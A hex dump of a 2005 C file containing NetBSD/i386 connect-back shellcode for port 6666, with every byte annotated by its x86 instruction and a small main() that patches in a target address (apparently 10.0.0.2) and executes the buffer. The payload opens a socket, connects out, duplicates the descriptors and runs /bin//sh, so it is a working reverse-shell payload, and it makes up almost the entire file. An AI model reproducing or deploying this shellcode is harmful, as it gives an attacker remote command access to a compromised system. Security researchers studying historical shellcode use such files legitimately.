00000000  2f 2a 0d 0a 20 2a 20 20  6d 69 6e 65 72 76 69 6e  |/*.. *  minervin|
00000010  69 20 61 74 20 6e 65 75  72 61 6c 6e 6f 69 73 65  |i at neuralnoise|
00000020  20 64 6f 74 20 63 6f 6d  20 28 63 29 20 32 30 30  | dot com (c) 200|
00000030  35 0d 0a 20 2a 20 20 4e  65 74 42 53 44 2f 69 33  |5.. *  NetBSD/i3|
00000040  38 36 20 32 2e 30 2c 20  63 61 6c 6c 62 61 63 6b  |86 2.0, callback|
00000050  20 73 68 65 6c 6c 63 6f  64 65 20 28 70 6f 72 74  | shellcode (port|
00000060  20 36 36 36 36 29 3b 0d  0a 20 2a 2f 0d 0a 0d 0a  | 6666);.. */....|
00000070  23 69 6e 63 6c 75 64 65  20 22 73 79 73 2f 74 79  |#include "sys/ty|
00000080  70 65 73 2e 68 22 0d 0a  23 69 6e 63 6c 75 64 65  |pes.h"..#include|
00000090  20 22 73 74 64 69 6f 2e  68 22 0d 0a 23 69 6e 63  | "stdio.h"..#inc|
000000a0  6c 75 64 65 20 22 73 74  72 69 6e 67 2e 68 22 0d  |lude "string.h".|
000000b0  0a 0d 0a 63 68 61 72 20  73 63 6f 64 65 5b 5d 20  |...char scode[] |
000000c0  3d 0d 0a 20 20 22 5c 78  33 31 5c 78 63 30 22 20  |=..  "\x31\xc0" |
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |            // x|
000000e0  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
000000f0  0a 20 20 22 5c 78 33 31  5c 78 63 39 22 09 09 20  |.  "\x31\xc9".. |
00000100  2f 2f 20 78 6f 72 20 20  20 20 25 65 63 78 2c 25  |// xor    %ecx,%|
00000110  65 63 78 0d 0a 20 20 22  5c 78 35 30 22 20 20 20  |ecx..  "\x50"   |
00000120  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000130  20 70 75 73 68 20 20 20  25 65 61 78 0d 0a 20 20  | push   %eax..  |
00000140  22 5c 78 34 30 22 20 20  20 20 20 20 20 20 20 20  |"\x40"          |
00000150  20 20 20 20 20 20 20 2f  2f 20 69 6e 63 20 20 20  |       // inc   |
00000160  20 25 65 61 78 0d 0a 20  20 22 5c 78 35 30 22 20  | %eax..  "\x50" |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  2f 2f 20 70 75 73 68 20  20 20 25 65 61 78 0d 0a  |// push   %eax..|
00000190  20 20 22 5c 78 34 30 22  20 20 20 20 20 20 20 20  |  "\x40"        |
000001a0  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 63 20  |         // inc |
000001b0  20 20 20 25 65 61 78 0d  0a 20 20 22 5c 78 35 30  |   %eax..  "\x50|
000001c0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000001d0  20 20 2f 2f 20 70 75 73  68 20 20 20 25 65 61 78  |  // push   %eax|
000001e0  0d 0a 20 20 22 5c 78 35  30 22 20 20 20 20 20 20  |..  "\x50"      |
000001f0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000200  73 68 20 20 20 25 65 61  78 0d 0a 20 20 22 5c 78  |sh   %eax..  "\x|
00000210  62 30 5c 78 36 31 22 20  20 20 20 20 20 20 20 20  |b0\x61"         |
00000220  20 20 20 20 2f 2f 20 6d  6f 76 20 20 20 20 24 30  |    // mov    $0|
00000230  78 36 31 2c 25 61 6c 0d  0a 20 20 22 5c 78 63 64  |x61,%al..  "\xcd|
00000240  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000250  20 20 2f 2f 20 69 6e 74  20 20 20 20 24 30 78 38  |  // int    $0x8|
00000260  30 0d 0a 20 20 22 5c 78  38 39 5c 78 63 33 22 20  |0..  "\x89\xc3" |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
00000280  6f 76 20 20 20 20 25 65  61 78 2c 25 65 62 78 0d  |ov    %eax,%ebx.|
00000290  0a 20 20 22 5c 78 38 39  5c 78 65 32 22 20 20 20  |.  "\x89\xe2"   |
000002a0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000002b0  20 20 20 20 25 65 73 70  2c 25 65 64 78 0d 0a 20  |    %esp,%edx.. |
000002c0  20 22 5c 78 34 39 22 20  20 20 20 20 20 20 20 20  | "\x49"         |
000002d0  20 20 20 20 20 20 20 20  2f 2f 20 64 65 63 20 20  |        // dec  |
000002e0  20 20 25 65 63 78 0d 0a  20 20 22 5c 78 35 31 22  |  %ecx..  "\x51"|
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000300  20 2f 2f 20 70 75 73 68  20 20 20 25 65 63 78 0d  | // push   %ecx.|
00000310  0a 20 20 22 5c 78 35 31  22 20 20 20 20 20 20 20  |.  "\x51"       |
00000320  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000330  68 20 20 20 25 65 63 78  0d 0a 20 20 22 5c 78 34  |h   %ecx..  "\x4|
00000340  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000350  20 20 20 2f 2f 20 69 6e  63 20 20 20 20 25 65 63  |   // inc    %ec|
00000360  78 0d 0a 20 20 22 5c 78  36 38 5c 78 66 35 5c 78  |x..  "\x68\xf5\x|
00000370  66 66 5c 78 66 66 5c 78  66 64 22 20 2f 2f 20 70  |ff\xff\xfd" // p|
00000380  75 73 68 20 20 20 24 30  78 66 64 66 66 66 66 66  |ush   $0xfdfffff|
00000390  35 0d 0a 20 20 22 5c 78  36 38 5c 78 66 66 5c 78  |5..  "\x68\xff\x|
000003a0  66 64 5c 78 65 35 5c 78  66 35 22 20 2f 2f 20 70  |fd\xe5\xf5" // p|
000003b0  75 73 68 20 20 20 24 30  78 66 35 65 35 66 64 66  |ush   $0xf5e5fdf|
000003c0  66 0d 0a 20 20 22 5c 78  62 31 5c 78 31 30 22 20  |f..  "\xb1\x10" |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
000003e0  6f 76 20 20 20 20 24 30  78 31 30 2c 25 63 6c 0d  |ov    $0x10,%cl.|
000003f0  0a 20 20 22 5c 78 35 31  22 20 20 20 20 20 20 20  |.  "\x51"       |
00000400  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000410  68 20 20 20 25 65 63 78  0d 0a 20 20 22 5c 78 66  |h   %ecx..  "\xf|
00000420  36 5c 78 31 32 22 20 20  20 20 20 20 20 20 20 20  |6\x12"          |
00000430  20 20 20 2f 2f 20 6e 6f  74 62 20 20 20 28 25 65  |   // notb   (%e|
00000440  64 78 29 0d 0a 20 20 22  5c 78 34 61 22 20 20 20  |dx)..  "\x4a"   |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000460  20 64 65 63 20 20 20 20  25 65 64 78 0d 0a 20 20  | dec    %edx..  |
00000470  22 5c 78 65 32 5c 78 66  62 22 20 20 20 20 20 20  |"\xe2\xfb"      |
00000480  20 20 20 20 20 20 20 2f  2f 20 6c 6f 6f 70 20 20  |       // loop  |
00000490  20 2e 2d 33 0d 0a 20 20  22 5c 78 66 36 5c 78 31  | .-3..  "\xf6\x1|
000004a0  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |2"             /|
000004b0  2f 20 6e 6f 74 62 20 20  20 28 25 65 64 78 29 0d  |/ notb   (%edx).|
000004c0  0a 20 20 22 5c 78 35 32  22 20 20 20 20 20 20 20  |.  "\x52"       |
000004d0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
000004e0  68 20 20 20 25 65 64 78  0d 0a 20 20 22 5c 78 35  |h   %edx..  "\x5|
000004f0  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000500  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 61  |   // push   %ea|
00000510  78 0d 0a 20 20 22 5c 78  35 30 22 20 20 20 20 20  |x..  "\x50"     |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000530  75 73 68 20 20 20 25 65  61 78 0d 0a 20 20 22 5c  |ush   %eax..  "\|
00000540  78 62 30 5c 78 36 32 22  20 20 20 20 20 20 20 20  |xb0\x62"        |
00000550  20 20 20 20 20 2f 2f 20  6d 6f 76 20 20 20 20 24  |     // mov    $|
00000560  30 78 36 32 2c 25 61 6c  0d 0a 20 20 22 5c 78 63  |0x62,%al..  "\xc|
00000570  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00000580  20 20 20 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |   // int    $0x|
00000590  38 30 0d 0a 20 20 22 5c  78 62 31 5c 78 30 33 22  |80..  "\xb1\x03"|
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000005b0  6d 6f 76 20 20 20 20 24  30 78 33 2c 25 63 6c 0d  |mov    $0x3,%cl.|
000005c0  0a 20 20 22 5c 78 34 39  22 20 20 20 20 20 20 20  |.  "\x49"       |
000005d0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 64 65 63  |          // dec|
000005e0  20 20 20 20 25 65 63 78  0d 0a 20 20 22 5c 78 35  |    %ecx..  "\x5|
000005f0  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000600  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 63  |   // push   %ec|
00000610  78 0d 0a 20 20 22 5c 78  34 31 22 20 20 20 20 20  |x..  "\x41"     |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000630  6e 63 20 20 20 20 25 65  63 78 0d 0a 20 20 22 5c  |nc    %ecx..  "\|
00000640  78 35 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |x53"            |
00000650  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000660  65 62 78 0d 0a 20 20 22  5c 78 35 30 22 20 20 20  |ebx..  "\x50"   |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000680  20 70 75 73 68 20 20 20  25 65 61 78 0d 0a 20 20  | push   %eax..  |
00000690  22 5c 78 62 30 5c 78 35  61 22 20 20 20 20 20 20  |"\xb0\x5a"      |
000006a0  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
000006b0  20 24 30 78 35 61 2c 25  61 6c 0d 0a 20 20 22 5c  | $0x5a,%al..  "\|
000006c0  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
000006d0  20 20 20 20 20 2f 2f 20  69 6e 74 20 20 20 20 24  |     // int    $|
000006e0  30 78 38 30 0d 0a 20 20  22 5c 78 65 32 5c 78 66  |0x80..  "\xe2\xf|
000006f0  35 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |5"             /|
00000700  2f 20 6c 6f 6f 70 20 20  20 2e 2d 39 0d 0a 20 20  |/ loop   .-9..  |
00000710  22 5c 78 35 31 22 20 20  20 20 20 20 20 20 20 20  |"\x51"          |
00000720  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000730  20 25 65 63 78 0d 0a 20  20 22 5c 78 36 38 5c 78  | %ecx..  "\x68\x|
00000740  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 22 20  |2f\x2f\x73\x68" |
00000750  2f 2f 20 70 75 73 68 20  20 20 24 30 78 36 38 37  |// push   $0x687|
00000760  33 32 66 32 66 0d 0a 20  20 22 5c 78 36 38 5c 78  |32f2f..  "\x68\x|
00000770  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 22 20  |2f\x62\x69\x6e" |
00000780  2f 2f 20 70 75 73 68 20  20 20 24 30 78 36 65 36  |// push   $0x6e6|
00000790  39 36 32 32 66 0d 0a 20  20 22 5c 78 38 39 5c 78  |9622f..  "\x89\x|
000007a0  65 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3"             |
000007b0  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
000007c0  65 62 78 0d 0a 20 20 22  5c 78 35 31 22 20 20 20  |ebx..  "\x51"   |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000007e0  20 70 75 73 68 20 20 20  25 65 63 78 0d 0a 20 20  | push   %ecx..  |
000007f0  22 5c 78 35 34 22 20 20  20 20 20 20 20 20 20 20  |"\x54"          |
00000800  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000810  20 25 65 73 70 0d 0a 20  20 22 5c 78 35 33 22 20  | %esp..  "\x53" |
00000820  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000830  2f 2f 20 70 75 73 68 20  20 20 25 65 62 78 0d 0a  |// push   %ebx..|
00000840  20 20 22 5c 78 35 30 22  20 20 20 20 20 20 20 20  |  "\x50"        |
00000850  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000860  20 20 20 25 65 61 78 0d  0a 20 20 22 5c 78 62 30  |   %eax..  "\xb0|
00000870  5c 78 33 62 22 20 20 20  20 20 20 20 20 20 20 20  |\x3b"           |
00000880  20 20 2f 2f 20 6d 6f 76  20 20 20 20 24 30 78 33  |  // mov    $0x3|
00000890  62 2c 25 61 6c 0d 0a 20  20 22 5c 78 63 64 5c 78  |b,%al..  "\xcd\x|
000008a0  38 30 22 3b 20 20 20 20  20 20 20 20 20 20 20 20  |80";            |
000008b0  2f 2f 20 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |// int    $0x80.|
000008c0  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 20 7b 0d  |...int main() {.|
000008d0  0a 20 20 20 73 63 6f 64  65 5b 32 33 5d 20 3d 20  |.   scode[23] = |
000008e0  7e 31 30 3b 0d 0a 20 20  20 73 63 6f 64 65 5b 32  |~10;..   scode[2|
000008f0  34 5d 20 3d 20 7e 30 3b  0d 0a 20 20 20 73 63 6f  |4] = ~0;..   sco|
00000900  64 65 5b 32 35 5d 20 3d  20 7e 30 3b 0d 0a 20 20  |de[25] = ~0;..  |
00000910  20 73 63 6f 64 65 5b 32  36 5d 20 3d 20 7e 32 3b  | scode[26] = ~2;|
00000920  0d 0a 20 20 20 76 6f 69  64 20 28 2a 63 6f 64 65  |..   void (*code|
00000930  29 20 28 29 20 3d 20 28  76 6f 69 64 20 2a 29 20  |) () = (void *) |
00000940  73 63 6f 64 65 3b 0d 0a  20 20 20 70 72 69 6e 74  |scode;..   print|
00000950  66 28 22 6c 65 6e 67 74  68 3a 20 25 64 5c 6e 22  |f("length: %d\n"|
00000960  2c 20 73 74 72 6c 65 6e  28 73 63 6f 64 65 29 29  |, strlen(scode))|
00000970  3b 0d 0a 20 20 20 63 6f  64 65 28 29 3b 0d 0a 20  |;..   code();.. |
00000980  20 20 72 65 74 75 72 6e  20 28 30 29 3b 0d 0a 7d  |  return (0);..}|
00000990
